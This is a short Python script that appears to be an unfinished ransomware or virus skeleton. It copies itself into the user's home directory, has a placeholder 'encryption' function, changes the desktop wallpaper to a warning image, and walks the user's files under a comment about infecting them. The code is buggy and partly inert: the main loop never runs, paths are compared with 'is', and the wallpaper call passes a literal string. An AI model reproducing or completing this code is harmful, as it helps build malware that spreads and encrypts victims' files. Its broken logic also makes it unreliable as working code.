import shutil
import os
import sys
import hashlib
import ctypes

main_file_directory = os.getcwd()
user_name = os.getenv('username')
destination_directory = "C://Users//" + user_name
destination_directory_under = destination_directory
control = False

def encryption():
    print("Start encrypting")

def warning():
    wall_paper_path = "C:\Users\Austin\OneDrive\바탕 화면\img\StopCom.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, "wall_paper_path" , 3)
while control == True:
    if main_file_directory is not destination_directory:
        shutil.copy(main_file_directory,destination_directory)

    elif main_file_directory is destination_directory:
        #start infecting the virus
        for path,dir,files in os.walk(destination_directory):
            print(dir)
            print(files)